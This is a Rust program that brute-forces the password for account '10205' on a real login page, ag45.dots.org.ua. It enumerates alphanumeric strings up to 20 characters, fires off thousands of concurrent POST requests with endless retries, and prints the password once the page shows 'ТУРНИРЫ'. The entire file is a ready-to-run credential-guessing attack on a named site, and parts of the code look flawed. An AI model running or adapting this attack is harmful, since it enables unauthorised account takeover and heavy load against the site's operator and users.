use chrono::prelude::*;
use std::sync::atomic::{AtomicUsize, Ordering};

use itertools::Itertools;
use tokio::task::JoinHandle;

async fn password_generator<'a>() -> impl Iterator<Item = String> + 'a {
    let charset: &'a str = "abcdefghijklmnopqrstuvwxyz0123456789";

    (1..=20)
        .flat_map(move |len| {
            charset
                .chars()
                .combinations_with_replacement(len)
                .map(move |combos| (combos, len))
        })
        .flat_map(|(combos, len)| combos.into_iter().permutations(len))
        .dedup()
        .map(|chars| chars.into_iter().collect())
}

async fn sending_requests() {
    let request_amount = std::sync::Arc::new(AtomicUsize::new(0));
    let mut tasks: Vec<JoinHandle<Result<(), ()>>> = Vec::new();

    for password in password_generator().await {
        request_amount.fetch_add(1, std::sync::atomic::Ordering::Relaxed);

        tasks.push(tokio::spawn(async move {
            let fields = [("username", "10205"), ("password", &password)];

            loop {
                match reqwest::Client::new()
                    .post("https://ag45.dots.org.ua/login")
                    .form(&fields)
                    .send()
                    .await
                {
                    Ok(resp) => match resp.text().await {
                        Ok(text) => {
                            if text.contains("ТУРНИРЫ") {
                                println!(
                                    "[{}] Correct Password: '{}'; Request Amount: {}",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    &password,
                                    request_amount.load(Ordering::SeqCst)
                                );
                                std::process::exit(1);
                            }

                            break;
                        }
                        Err(_) => {}
                    },
                    Err(_) => {}
                };
            }
            Ok(())
        }));

        if tasks.len() % 10000 == 0 {
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            println!(
                "[{}] Starting {} tasks",
                Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                tasks.len()
            );
            futures::future::join_all(tasks).await;

            tasks = Vec::new();
        }
    }
}

#[tokio::main]
async fn main() {
    sending_requests().await
}
